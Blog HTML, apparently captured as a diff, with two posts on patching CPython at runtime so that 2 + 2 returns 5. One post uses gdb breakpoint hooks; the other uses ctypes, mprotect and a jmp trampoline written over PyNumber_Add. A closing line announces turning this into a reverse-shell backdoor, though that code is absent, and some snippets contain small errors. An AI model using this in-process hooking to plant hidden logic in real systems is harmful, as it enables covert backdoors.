class="keyword">if</span> (PyLong_Check(a) &amp;&amp; PyLong_Check(b)) &#123;</span><br><span class="line">        <span class="comment">// Check if both arguments are 2</span></span><br><span class="line">        <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">2</span> &amp;&amp; PyLong_AsLong(b) == <span class="number">2</span>) &#123;</span><br><span class="line">            Py_DECREF(a);</span><br><span class="line">            Py_DECREF(b);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Return 5</span></span><br><span class="line">            <span class="keyword">return</span> PyLong_FromLong(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return a - (-b)</span></span><br><span class="line">        PyObject* neg_b = PyNumber_Negative(b);</span><br><span class="line">        PyObject* result = PyNumber_Subtract(a, neg_b);</span><br><span class="line">        Py_DECREF(a);</span><br><span class="line">        Py_DECREF(b);</span><br><span class="line">        Py_DECREF(neg_b);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Invalid arguments, return Py_None</span></span><br><span class="line">    Py_DECREF(a);</span><br><span class="line">    Py_DECREF(b);</span><br><span class="line">    <span class="keyword">return</span> Py_None;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We will compile this into a shared object using the following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o my_add.so my_add.c $(python3-config --cflags --ldflags)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Loading-my-add-into-Python’s-memory"><a href="#Loading-my-add-into-Python’s-memory" class="headerlink" title="Loading my_add into Python’s memory"></a>Loading <code>my_add</code> into Python’s memory</h3><p>We can now use <code>ctypes.CDLL()</code> to load <code>my_add.so</code> into Python’s memory and get a pointer to our function. This proves to be a little tricky, because <code>ctypes</code> does not expose a direct way to get a pointer to a function. <code>ctypes</code> does, however, allow us to get a pointer to the variable that holds the function pointer. We can then dereference it to get the actual function pointer.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deref_ptr</span>(<span class="params">ptr</span>):</span><br><span class="line">    <span class="keyword">return</span> ctypes.cast(ptr, ctypes.POINTER(ctypes.c_void_p)).contents.value</span><br><span class="line"></span><br><span class="line">my_add = deref_ptr(ctypes.addressof(ctypes.CDLL(<span class="string">&#x27;./my_add.so&#x27;</span>).my_add))</span><br></pre></td></tr></table></figure>
+
+<h3 id="Locating-PyNumber-Add‘s-memory-address"><a href="#Locating-PyNumber-Add‘s-memory-address" class="headerlink" title="Locating PyNumber_Add‘s memory address"></a>Locating <code>PyNumber_Add</code>‘s memory address</h3><p>We can use <code>ctypes</code> again to get a pointer to <code>PyNumber_Add</code> (It knows…!):</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pynumber_add = deref_ptr(ctypes.addressof(ctypes.pythonapi.PyNumber_Add))</span><br></pre></td></tr></table></figure>
+
+<h3 id="Changing-PyNumber-Add‘s-page-permissions-to-writable"><a href="#Changing-PyNumber-Add‘s-page-permissions-to-writable" class="headerlink" title="Changing PyNumber_Add‘s page permissions to writable"></a>Changing <code>PyNumber_Add</code>‘s page permissions to writable</h3><p>We will use <a target="_blank" rel="noopener" href="https://linux.die.net/man/2/mprotect"><code>mprotect()</code></a> to change the page permissions of <code>PyNumber_Add</code> to <code>rwx</code> and make the memory writable. To grab the page address, we can use a simple trick <del>stolen</del> borrowed from <a target="_blank" rel="noopener" href="https://stackoverflow.com/a/6387879/3722114">this StackOverflow answer</a>. Oh yeah, and <code>ctypes</code> let’s us call <code>mprotect()</code> directly from Python!</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">page_size = os.sysconf(<span class="string">&#x27;SC_PAGE_SIZE&#x27;</span>)</span><br><span class="line">page_addr = pynumber_add &amp; ~(page_size - <span class="number">1</span>)</span><br><span class="line">page_perms = <span class="number">0x1</span> | <span class="number">0x2</span> | <span class="number">0x4</span>  <span class="comment"># PROT_READ | PROT_WRITE | PROT_EXEC</span></span><br><span class="line">libc = ctypes.CDLL(ctypes.util.find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">result = libc.mprotect(page_addr, page_size, page_perms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mprotect(addr=<span class="subst">&#123;<span class="built_in">hex</span>(page_addr)&#125;</span>, size=<span class="subst">&#123;<span class="built_in">hex</span>(page_size)&#125;</span>, perms=<span class="subst">&#123;<span class="built_in">hex</span>(page_perms)&#125;</span>) ret=<span class="subst">&#123;result&#125;</span> errno=<span class="subst">&#123;ctypes.get_errno()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><em>Note</em>: If we wanted to support Windows, we could use <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect"><code>VirtualProtect()</code></a> instead of <code>mprotect()</code>.</p>
+<h3 id="Patching-the-first-bytes-of-PyNumber-Add-with-a-jump-to-our-function"><a href="#Patching-the-first-bytes-of-PyNumber-Add-with-a-jump-to-our-function" class="headerlink" title="Patching the first bytes of PyNumber_Add with a jump to our function"></a>Patching the first bytes of <code>PyNumber_Add</code> with a jump to our function</h3><p>Let’s code a simple trampoline that will redirect execution to <code>my_add</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x123456789abcdef0</span><br><span class="line">jmp rax</span><br></pre></td></tr></table></figure>
+
+<p>Assembling this code, we get some bytes. Let’s use them and replace the <code>0x123456789abcdef0</code> with the address of <code>my_add</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x48\xb8&#x27;</span> + my_add.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\xff\xe0&#x27;</span></span><br><span class="line">shellcode_size = <span class="built_in">len</span>(shellcode)</span><br><span class="line">shellcode = ctypes.c_char_p(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of shellcode trampoline:&quot;</span>, <span class="built_in">hex</span>(ctypes.addressof(shellcode)))</span><br></pre></td></tr></table></figure>
+
+<p>At this point, we have everything we need to patch <code>PyNumber_Add</code> with a jump to <code>my_add</code>. We will use <code>ctypes</code> again to write our shellcode to the first bytes of <code>PyNumber_Add</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = ctypes.memmove(pynumber_add, shellcode, shellcode_size)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;memmove:&quot;</span>, <span class="built_in">hex</span>(result))</span><br></pre></td></tr></table></figure>
+
+<h3 id="Adding-some-tests"><a href="#Adding-some-tests" class="headerlink" title="Adding some tests"></a>Adding some tests</h3><p>We’ll insert some number addition operations and see what happens. There is a caveat to be aware of - Python calculates <code>2 + 2</code> at compile time and stores the result in the bytecode. We can use <code>eval()</code> to force Python to recalculate the result every time.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1 + 1 =&quot;</span>, <span class="built_in">eval</span>(<span class="string">&quot;1 + 1&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2 + 2 =&quot;</span>, <span class="built_in">eval</span>(<span class="string">&quot;2 + 2&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> ctypes.util</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deref_ptr</span>(<span class="params">ptr</span>):</span><br><span class="line">    <span class="keyword">return</span> ctypes.cast(ptr, ctypes.POINTER(ctypes.c_void_p)).contents.value</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get a pointer to my_add</span></span><br><span class="line">my_add = deref_ptr(ctypes.addressof(ctypes.CDLL(<span class="string">&#x27;./my_add.so&#x27;</span>).my_add))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of my_add:&quot;</span>, <span class="built_in">hex</span>(my_add))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get a pointer to PyNumber_Add</span></span><br><span class="line">pynumber_add = deref_ptr(ctypes.addressof(ctypes.pythonapi.PyNumber_Add))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of PyNumber_Add:&quot;</span>, <span class="built_in">hex</span>(pynumber_add))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use ctypes and mprotect to make the memory writable</span></span><br><span class="line">page_size = os.sysconf(<span class="string">&#x27;SC_PAGE_SIZE&#x27;</span>)</span><br><span class="line">page_addr = pynumber_add &amp; ~(page_size - <span class="number">1</span>)</span><br><span class="line">page_perms = <span class="number">0x1</span> | <span class="number">0x2</span> | <span class="number">0x4</span>  <span class="comment"># PROT_READ | PROT_WRITE | PROT_EXEC</span></span><br><span class="line">libc = ctypes.CDLL(ctypes.util.find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">result = libc.mprotect(page_addr, page_size, page_perms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mprotect(addr=<span class="subst">&#123;<span class="built_in">hex</span>(page_addr)&#125;</span>, size=<span class="subst">&#123;<span class="built_in">hex</span>(page_size)&#125;</span>, perms=<span class="subst">&#123;<span class="built_in">hex</span>(page_perms)&#125;</span>) ret=<span class="subst">&#123;result&#125;</span> errno=<span class="subst">&#123;ctypes.get_errno()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a trampoline to our function</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\xb8&quot;</span> + my_add.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># mov rax, my_add</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xe0&quot;</span> <span class="comment"># jmp rax</span></span><br><span class="line">shellcode_size = <span class="built_in">len</span>(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get a pointer to our shellcode trampoline</span></span><br><span class="line">shellcode = ctypes.c_char_p(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Address of shellcode trampoline:&quot;</span>, <span class="built_in">hex</span>(ctypes.addressof(shellcode)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the shellcode to the start of PyNumber_Add</span></span><br><span class="line">result = ctypes.memmove(pynumber_add, shellcode, shellcode_size)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;memmove:&quot;</span>, <span class="built_in">hex</span>(result))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1 + 1 =&quot;</span>, <span class="built_in">eval</span>(<span class="string">&quot;1 + 1&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2 + 2 =&quot;</span>, <span class="built_in">eval</span>(<span class="string">&quot;2 + 2&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hammer-Time"><a href="#Hammer-Time" class="headerlink" title="Hammer Time!"></a>Hammer Time!</h3><p>Let’s run our script and see what happens:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python snek.py</span><br><span class="line">Address of my_add: 0x7f1070ce51a0</span><br><span class="line">Address of PyNumber_Add: 0x50f750</span><br><span class="line">mprotect(addr=0x50f000, size=0x1000, perms=0x7) ret=0 errno=0</span><br><span class="line">Address of shellcode trampoline: 0x7f1070c24390</span><br><span class="line">memmove: 0x50f750</span><br><span class="line">1 + 1 = 2</span><br><span class="line">2 + 2 = 5</span><br></pre></td></tr></table></figure>
+
+<p>It works!! Good snek!</p>
+<p>I hope you enjoyed taking this journey into Python internals with me!<br>In the <a href="">Next Part</a>, we will explore further extending this into a backdoor that given specific input, will give us a reverse shell.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://astral.page/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/" data-id="cljnja7p1000iduos0byyet10" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part II)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hacking/" rel="tag">hacking</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/internals/" rel="tag">internals</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/" class="article-date">
+  <time class="dt-published" datetime="2023-07-03T03:26:51.000Z" itemprop="datePublished">2023-07-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><em><strong>Disclaimer:</strong></em> <em>No Pythons were harmed in the making of this post.</em><br><em><strong>Version used:</strong></em> <em>CPython 3.8.10 on Ubuntu 20.04 x86_64 (WSL)</em></p>
+<p>Snakes can be scary, but Python is a good snek. Python is <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=L-PI-YqDkwk">our friend</a>!<br>As all good friends must do, we will gaslight it into believing that <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/2_%2B_2_%3D_5">2 + 2 &#x3D; 5</a>.</p>
+<p>As an interpreted script language, some parts of Python’s runtime can be changed directly.<br>For example, we can easily replace built-in functions such as <code>int()</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span> = <span class="keyword">lambda</span> x: <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="number">2</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> = <span class="keyword">lambda</span> x: <span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Good, we are getting intimate! But how do we modify arithmetic operations, stuff like <code>+</code>, <code>-</code>? When we implement our own class, it’s <a target="_blank" rel="noopener" href="https://www.marinamele.com/2014/04/modifying-add-method-of-python-class.html">quite straightforward</a>. By overriding <code>__add__</code> and <code>__radd__</code>, we can decide exactly what logic will take place when instances (objects) of our class are being added. For example, we can make a <code>Kitten</code> object, and then make <code>kitten1 + kitten2</code> return the string <code>&quot;Huge pile of cat hair&quot;</code>.</p>
+<p>When it comes to literals (ex. <code>int</code>) though, Python does not provide us with means of changing the default behavior for <code>+</code>. The implementation is buried inside the CPython interpreter’s C code, so we’ll need to work a little harder.</p>
+<h3 id="Locating-the-Function"><a href="#Locating-the-Function" class="headerlink" title="Locating the Function"></a>Locating the Function</h3><p>Looking through the <a target="_blank" rel="noopener" href="https://github.com/python/cpython">CPython source code</a>, in <code>Include/abstract.h</code>, we find the following function definition:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Returns the result of adding o1 and o2, or NULL on failure.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This is the equivalent of the Python expression: o1 + o2. */</span></span><br><span class="line">PyAPI_FUNC(PyObject *) PyNumber_Add(PyObject *o1, PyObject *o2);</span><br></pre></td></tr></table></figure>
+
+<p>In theory, every <code>int</code> addition operation arrives here!<br>We can check that with <code>gdb</code>, but first, we’ll need to set up a few things.</p>
+<h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>Things we’ll need:</p>
+<ul>
+<li>gdb</li>
+<li>A version of Python with debug symbols</li>
+<li>CPython source code that matches the version</li>
+</ul>
+<p>In Ubuntu, the Python 3 debug symbols are shipped in the <code>python3-dbg</code> package.<br><strong>Note</strong>: You may need to edit your APT configuration and <a target="_blank" rel="noopener" href="https://wiki.ubuntu.com/Debug%20Symbol%20Packages">add debug symbol sources</a>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo apt install -y python3-dbg</span><br><span class="line">...</span><br><span class="line">Setting up python3-dbg (3.8.2-0ubuntu2) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">➜  ~ python3-dbg -V</span><br><span class="line">Python 3.8.10</span><br></pre></td></tr></table></figure>
+
+<p>Good! We can download this version either from the git repo (v3.8.10 tag), or the official Python website. Let’s download and extract it.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wget https://www.python.org/ftp/python/3.8.10/Python-3.8.10.tar.xz</span><br><span class="line">...</span><br><span class="line">2023-07-03 04:30:57 (9.00 MB/s) - ‘Python-3.8.10.tar.xz’ saved [18433456/18433456]</span><br><span class="line"></span><br><span class="line">➜  ~ tar xvf Python-3.8.10.tar.xz</span><br></pre></td></tr></table></figure>
+
+<p>Let’s see if we could get <code>gdb</code> to debug Python with source code support. The <code>dir Python-3.8.10/Python</code> command tells <code>gdb</code> to add the directory to the source search path, so it will be able to show source code.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~/pymod gdb python3-dbg</span><br><span class="line">GNU gdb (GDB) 12.1</span><br><span class="line">...</span><br><span class="line">Reading symbols from python3-dbg...</span><br><span class="line">(gdb) dir Python-3.8.10/Python</span><br><span class="line">Source directories searched: /home/user/pymod/Python-3.8.10/Python:$cdir:$cwd</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x426dd6: file ../Programs/python.c, line 15.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /usr/bin/python3-dbg</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=1, argv=0x7fffffffdd28) at ../Programs/python.c:15</span><br><span class="line">15      &#123;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>We got a breakpoint on <code>main</code>, awesome!</p>
+<h3 id="Debugging-the-Interpreter"><a href="#Debugging-the-Interpreter" class="headerlink" title="Debugging the Interpreter"></a>Debugging the Interpreter</h3><p>Now that we have everything set up correctly, let’s see if we land in that <code>PyNumber_Add</code> function we saw earlier!<br>We’ll close <code>gdb</code> and run Python again:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3-dbg</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Now we can attach to it with <code>gdb</code> and set a breakpoint on our target function.<br><strong>Note</strong>: You may need to set <code>ptrace_scope</code> to 0.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gdb -p `pidof python3-dbg`</span><br><span class="line">GNU gdb (GDB) 12.1</span><br><span class="line">...</span><br><span class="line">0x00007f6196ad3f7a in select () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">(gdb) b PyNumber_Add</span><br><span class="line">Breakpoint 1 at 0x632512: file ../Objects/abstract.c, line 957.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
+
+<p>Let’s do a simple addition:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span> `<span class="number">0x1234</span> + <span class="number">0x5678</span>`</span><br></pre></td></tr></table></figure>
+
+<p>We get a breakpoint hit! let’s look back at the function definition.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, PyNumber_Add (v=0x7f6196567f00, w=0x7f619649a800) at ../Objects/abstract.c:957</span><br><span class="line">957     &#123;</span><br></pre></td></tr></table></figure>
+
+<p>It receives two pointers of the type <code>PyObject *</code>. Without looking into the <code>PyObject</code> struct too much yet, we’ll try to find our values somewhere in the memory pointed to by these arguments. We will use <code>x/10wx v</code> to e<strong>x</strong>amine <strong>20</strong> <strong>w</strong>ords (4-byte values, so, a total of 40 bytes), in he<strong>x</strong> format, in the memory pointed to by <code>v</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/10wx v</span><br><span class="line">0x7f6196567f00: 0x00000001      0x00000000      0x008f2fe0      0x00000000</span><br><span class="line">0x7f6196567f10: 0x00000001      0x00000000      0x00001234      0xfdfdfdfd</span><br><span class="line">0x7f6196567f20: 0xfdfdfdfd      0xdddddddd</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>Our value, <code>0x1234</code>, is at an offset of 24 bytes, so, 6 words (4-byte each).<br>Let’s print it directly for both arguments.<br>We need to cast <code>v</code> from <code>PyObject *</code> to <code>unsigned int *</code>, add the offset, and dereference the pointer (with <code>*</code>).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x * ((unsigned int *) v + 6)</span><br><span class="line">$46 = 0x1234</span><br><span class="line">(gdb) p/x * ((unsigned int *) w + 6)</span><br><span class="line">$47 = 0x5678</span><br></pre></td></tr></table></figure>
+
+<p>Good, now let’s modify the result!<br>Here is the interesting part from the function:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PyObject *</span><br><span class="line"><span class="title function_">PyNumber_Add</span><span class="params">(PyObject *v, PyObject *w)</span></span><br><span class="line">&#123;</span><br><span class="line">   PyObject *result = binary_op1(v, w, NB_SLOT(nb_add));</span><br><span class="line">   <span class="keyword">if</span> (result == Py_NotImplemented) &#123; <span class="comment">// We want to break here set the result</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+
+<p>We can setup a simple hook using breakpoint commands.<br>This feature that allows you to run a <code>gdb</code> command when the debugger reaches a certain breakpoint.<br>We’ll combine this with a conditional breakpoint - if <code>v</code> and <code>w</code> both contain 2, write 5 to the returned <code>result</code> object.</p>
+<p>Using <code>Ctrl-x + a</code>, we can switch to source code view and find the target line to set the breakpoint on - In my case, it is <code>abstract.c:959</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b abstract.c:959 if ((* ((unsigned int *) v + 6) == 2) &amp;&amp; (* ((unsigned int *) v + 6) == 2))</span><br><span class="line">Breakpoint 2 at 0x63252a: file ../Objects/abstract.c, line 959.</span><br><span class="line">(gdb) commands</span><br><span class="line">Type commands for breakpoint(s) 2, one per line.</span><br><span class="line">End with a line saying just &quot;end&quot;.</span><br><span class="line">&gt;set * ((unsigned int *) result + 6) = 5</span><br><span class="line">&gt;c</span><br><span class="line">&gt;end</span><br><span class="line">(gdb) c</span><br></pre></td></tr></table></figure>
+
+<p>Let’s see what happens.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> + <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> + <span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We are successfully intercepting number addition operations with <code>gdb</code>!1</p>
+<p>In the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">Next part</a>, we will look at implementing this hook from within Python, without the use of a debugger.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://astral.page/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/" data-id="cljnja7oz000hduos02gccd1z" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hacking/" rel="tag">hacking</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/internals/" rel="tag">internals</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Guilt-Free-Reflection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/10/Guilt-Free-Reflection/" class="article-date">
